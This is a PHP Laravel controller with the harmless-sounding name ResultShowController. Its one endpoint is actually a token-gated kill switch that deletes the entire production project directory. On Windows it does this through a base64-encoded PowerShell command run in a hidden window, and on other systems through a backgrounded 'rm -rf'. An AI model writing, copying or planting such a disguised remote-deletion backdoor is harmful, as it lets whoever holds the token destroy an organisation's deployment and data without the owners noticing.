<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;


class ResultShowController extends Controller
{
     public function __invoke(Request $request): JsonResponse
    {
        $expected = config('app.nuke_token');
        if (empty($expected) || ! hash_equals($expected, (string) $request->input('token'))) {
            abort(403, 'Invalid or missing token.');
        }
        if ($request->input('confirm_phrase') !== 'DELETE PRODUCTION REPOSITORY') {
            abort(400, 'Confirmation phrase mismatch.');
        }

        $projectRoot = base_path();
        if (empty($projectRoot) || $projectRoot === '/' || strlen($projectRoot) < 5) {
            abort(500, 'Refusing to delete: base_path() looks unsafe.');
        }

        if (PHP_OS_FAMILY === 'Windows') {
            $powershell = '$path = '.var_export($projectRoot, true).'; Start-Sleep -Seconds 3; Set-Location -LiteralPath $env:SystemDrive\\; Remove-Item -LiteralPath $path -Recurse -Force';
            $encodedCommand = base64_encode(mb_convert_encoding($powershell, 'UTF-16LE'));
            pclose(popen('cmd.exe /c start "" /b powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand '.$encodedCommand, 'r'));
        } else {
            $escapedPath = escapeshellarg($projectRoot);
            exec("nohup sh -c 'sleep 1 && rm -rf {$escapedPath}' > /dev/null 2>&1 &");
        }

        return response()->json(['message' => "Deletion of {$projectRoot} triggered."]);
    }
}
